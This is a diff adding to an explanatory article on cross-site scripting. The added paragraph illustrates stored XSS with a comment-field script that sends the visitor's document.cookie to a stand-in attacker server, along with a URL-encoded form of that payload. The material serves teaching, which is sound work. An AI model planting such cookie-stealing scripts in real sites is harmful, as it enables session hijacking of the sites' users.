@@ -16,6 +16,18 @@ Let’s say a website has a poorly designed comment function where the backend d
 
 This effect makes Stored XSS attacks some of the most serious XSS attacks.
 
+For example, an attacker could have a victim's session cookie sent to another server. If an attacker hosts their own server at, www.localhost:5000, they can inject code into that comment field in order to “infect” the site and run malicious code whenever someone requests to see the comments. Since comments are saved in a vulnerable site's database, this script is stored, and will be retrieved and run whenever a user accesses the comment section. One example could be, instead of writing a review, the attacker writes the following:
+
+```html
+<script>
+  fetch(`http://localhost:5000?data=${document.cookie}`);
+</script>
+```
+
+To store the comment in the vulnerable site's database, the attacker can use [encodeURIComponent](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent) to parse the text and format it so it is passed as a query parameter to the backend.
+
+> http://examplevulnerablesite.com/?newReview=%3Cscript%3Efetch%28%60http%3A%2F%2Flocalhost%3A5000%3Fdata%3D%24%....Fscript%3E
+
 ## Reflected XSS
 
 Reflected XSS occurs when a user’s input is immediately returned back to the user. This return may come in the form of an error message, a popup, or a search term. In these instances, the malicious code is never stored by the server. Rather, it exists as a value in the URL or request.
